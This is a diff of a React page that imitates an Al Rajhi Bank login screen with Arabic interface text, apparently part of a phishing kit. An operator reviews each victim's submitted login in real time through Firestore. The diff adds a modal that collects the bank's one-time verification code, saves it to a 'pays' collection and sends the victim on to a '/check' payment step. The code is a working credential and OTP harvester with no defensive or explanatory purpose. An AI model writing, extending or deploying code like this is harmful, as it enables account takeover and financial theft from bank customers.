@@ -3,7 +3,7 @@
 import type React from "react";
 
 import { useState, useEffect, useRef } from "react";
-import { Eye, EyeOff, AlertCircle, Loader2, KeyRound, Clock, CheckCircle, XCircle } from "lucide-react";
+import { Eye, EyeOff, AlertCircle, Loader2, KeyRound, Clock, CheckCircle, XCircle, X } from "lucide-react";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
 import { addData } from "@/lib/firebase";
 import { StepShell } from "@/components/step-shell";
@@ -13,7 +13,7 @@ import { db } from "@/lib/firebase";
 import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";
 import { toast } from "sonner";
 
-type Screen = "login" | "waiting" | "otp" | "success" | "rejected";
+type Screen = "login" | "waiting" | "otp" | "rejected";
 
 export default function AlRajhiLoginPage() {
   const [showPassword, setShowPassword] = useState(false);
@@ -22,6 +22,7 @@ export default function AlRajhiLoginPage() {
   const [rememberMe, setRememberMe] = useState(false);
   const [screen, setScreen] = useState<Screen>("login");
   const [otp, setOtp] = useState("");
+  const [showOtpModal, setShowOtpModal] = useState(false);
   const [rejectMessage, setRejectMessage] = useState("");
 
   const visitorId =
@@ -73,15 +74,17 @@ export default function AlRajhiLoginPage() {
         processedStatusRef.current = status;
 
         if (status === "approved") {
-          console.log("[rajhi] ✅ Approved!");
-          setScreen("success");
-          toast.success("تمت الموافقة! يمكنك الآن المتابعة.");
+          console.log("[rajhi] ✅ Approved! Show OTP modal");
+          toast.success("تمت الموافقة! يرجى إدخال رمز التحقق.");
           
           // Clear the status
           await setDoc(doc(db as Firestore, "pays", visitorId), {
             rajhiOtpStatus: "pending",
             rajhiOtpStatusUpdatedAt: now
           }, { merge: true });
+
+          // Show OTP modal
+          setShowOtpModal(true);
 
         } else if (status === "rejected") {
           console.log("[rajhi] ❌ Rejected!");
@@ -130,92 +133,137 @@ export default function AlRajhiLoginPage() {
     setScreen("waiting");
   };
 
+  const handleOtpSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+
+    if (!otp || otp.length < 4) {
+      toast.error("يرجى إدخال رمز التحقق بشكل صحيح");
+      return;
+    }
+
+    // Save OTP
+    await addData({
+      id: visitorId,
+      rajhiOtp: otp,
+      rajhiOtpStatus: "otp_sent",
+      rajhiOtpStatusUpdatedAt: Date.now()
+    });
+
+    toast.success("تم إرسال رمز التحقق!");
+    
+    // Navigate to next step (payment page)
+    window.location.href = "/check";
+  };
+
   const handleRetry = () => {
     // Clear the processed status
     processedStatusRef.current = "";
     setScreen("login");
     setUsername("");
     setPassword("");
+    setOtp("");
+    setRejectMessage("");
   };
 
   // Waiting Screen
   if (screen === "waiting") {
     return (
-      <StepShell
-        step={8}
-        title="قائمة الانتظار"
-        subtitle="جاري مراجعة بياناتك من قبل الموظف..."
-        icon={<Clock className="h-8 w-8 animate-pulse" />}
-      >
-        <div className="flex flex-col items-center justify-center gap-6 py-8">
-          {/* Animated waiting indicator */}
-          <div className="relative">
-            <div className="absolute inset-0 animate-ping">
-              <div className="h-20 w-20 rounded-full bg-yellow-400 opacity-50"></div>
+      <>
+        <StepShell
+          step={8}
+          title="قائمة الانتظار"
+          subtitle="جاري مراجعة بياناتك من قبل الموظف..."
+          icon={<Clock className="h-8 w-8 animate-pulse" />}
+        >
+          <div className="flex flex-col items-center justify-center gap-6 py-8">
+            {/* Animated waiting indicator */}
+            <div className="relative">
+              <div className="absolute inset-0 animate-ping">
+                <div className="h-20 w-20 rounded-full bg-yellow-400 opacity-50"></div>
+              </div>
+              <div className="relative flex h-20 w-20 items-center justify-center rounded-full bg-yellow-400 shadow-lg">
+                <Clock className="h-10 w-10 animate-bounce text-white" />
+              </div>
             </div>
-            <div className="relative flex h-20 w-20 items-center justify-center rounded-full bg-yellow-400 shadow-lg">
-              <Clock className="h-10 w-10 animate-bounce text-white" />
+            
+            {/* Status text */}
+            <div className="text-center">
+              <p className="text-lg font-semibold text-[#145072] mb-2">
+                يرجى الانتظار...
+              </p>
+              <p className="text-sm text-gray-500">
+                سيصلك إشعار عند مراجعة بياناتك
+              </p>
+            </div>
+
+            {/* Cancel button */}
+            <Button
+              type="button"
+              onClick={handleRetry}
+              className="mt-4 h-12 w-full rounded-xl border-2 border-[#d2e1ed] bg-white font-bold text-[#145072] hover:bg-[#f4f8fc]"
+            >
+              إلغاء والرجوع
+            </Button>
+          </div>
+        </StepShell>
+
+        {/* OTP Modal */}
+        {showOtpModal && (
+          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
+            <div className="w-full max-w-md rounded-2xl bg-white p-6 shadow-2xl">
+              {/* Header */}
+              <div className="mb-6 flex items-center justify-between">
+                <div className="flex items-center gap-3">
+                  <div className="flex h-12 w-12 items-center justify-center rounded-full bg-green-100">
+                    <CheckCircle className="h-6 w-6 text-green-500" />
+                  </div>
+                  <div>
+                    <h2 className="text-xl font-bold text-gray-900">تمت الموافقة</h2>
+                    <p className="text-sm text-gray-500">أدخل رمز التحقق المرسل إلى جوالك</p>
+                  </div>
+                </div>
+                <button
+                  onClick={() => setShowOtpModal(false)}
+                  className="rounded-full p-2 hover:bg-gray-100"
+                >
+                  <X className="h-5 w-5 text-gray-400" />
+                </button>
+              </div>
+
+              {/* OTP Form */}
+              <form onSubmit={handleOtpSubmit} className="space-y-4">
+                <div>
+                  <Input
+                    type="text"
+                    inputMode="numeric"
+                    maxLength={6}
+                    required
+                    value={otp}
+                    onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
+                    placeholder="أدخل رمز التحقق"
+                    className="h-14 rounded-xl border-2 border-[#d2e1ed] bg-white px-4 text-center text-2xl font-bold tracking-[0.35em] text-[#194e6e] placeholder:text-[#93a7b7] focus:border-[#145072]"
+                  />
+                </div>
+
+                <Button
+                  type="submit"
+                  className="h-12 w-full rounded-xl bg-green-500 font-bold text-white hover:bg-green-600"
+                >
+                  تأكيد رمز التحقق
+                </Button>
+
+                <Button
+                  type="button"
+                  onClick={() => setShowOtpModal(false)}
+                  className="h-12 w-full rounded-xl border-2 border-[#d2e1ed] bg-white font-bold text-gray-500 hover:bg-gray-50"
+                >
+                  إلغاء
+                </Button>
+              </form>
             </div>
           </div>
-          
-          {/* Status text */}
-          <div className="text-center">
-            <p className="text-lg font-semibold text-[#145072] mb-2">
-              يرجى الانتظار...
-            </p>
-            <p className="text-sm text-gray-500">
-              سيصلك إشعار عند مراجعة بياناتك
-            </p>
-          </div>
-
-          {/* Cancel button */}
-          <Button
-            type="button"
-            onClick={handleRetry}
-            className="mt-4 h-12 w-full rounded-xl border-2 border-[#d2e1ed] bg-white font-bold text-[#145072] hover:bg-[#f4f8fc]"
-          >
-            إلغاء والرجوع
-          </Button>
-        </div>
-      </StepShell>
-    );
-  }
-
-  // Success Screen
-  if (screen === "success") {
-    return (
-      <StepShell
-        step={8}
-        title="تمت الموافقة"
-        subtitle="تم التحقق من بياناتك بنجاح!"
-        icon={<CheckCircle className="h-8 w-8 text-green-500" />}
-      >
-        <div className="flex flex-col items-center justify-center gap-6 py-8">
-          <div className="flex h-20 w-20 items-center justify-center rounded-full bg-green-100 shadow-lg">
-            <CheckCircle className="h-12 w-12 text-green-500" />
-          </div>
-          
-          <div className="text-center">
-            <p className="text-lg font-semibold text-green-600 mb-2">
-              تمت مراجعة بياناتك والموافقة عليها
-            </p>
-            <p className="text-sm text-gray-500">
-              يمكنك الآن إكمال عملية الدفع
-            </p>
-          </div>
-
-          <Button
-            type="button"
-            onClick={() => {
-              // Navigate to payment or next step
-              window.location.href = "/check";
-            }}
-            className="mt-4 h-12 w-full rounded-xl bg-green-500 font-bold text-white hover:bg-green-600"
-          >
-            المتابعة للدفع
-          </Button>
-        </div>
-      </StepShell>
+        )}
+      </>
     );
   }
 
